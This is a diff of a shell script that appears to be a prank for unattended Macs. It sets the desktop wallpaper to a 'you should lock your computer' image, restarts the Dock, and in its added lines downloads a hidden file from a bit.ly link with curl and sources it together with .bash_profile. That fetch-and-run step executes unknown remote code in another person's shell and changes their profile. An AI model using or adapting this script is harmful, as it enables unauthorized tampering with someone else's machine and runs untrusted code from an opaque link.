@@ -5,8 +5,8 @@ osascript -e 'tell application "Finder" to activate' -e 'tell application "Syste
 cd ~/Desktop
 curl -o youshouldlockyourcomputer.png http://i.imgur.com/JMflWrl.jpg
 defaults write com.apple.desktop Background '{default = {ImageFilePath = "~/Desktop/youshouldlockyourcomputer.png"; }; }'
-cd ~
-curl -o bit.ly/robotunicornalias
-. .robotUnicornAlias.sh
-. .bash_profile
 killall Dock
+cd ~
+curl -Lso .robotunicornalias http://bit.ly/robotunicornalias
+source .robotunicornalias
+source .bash_profile
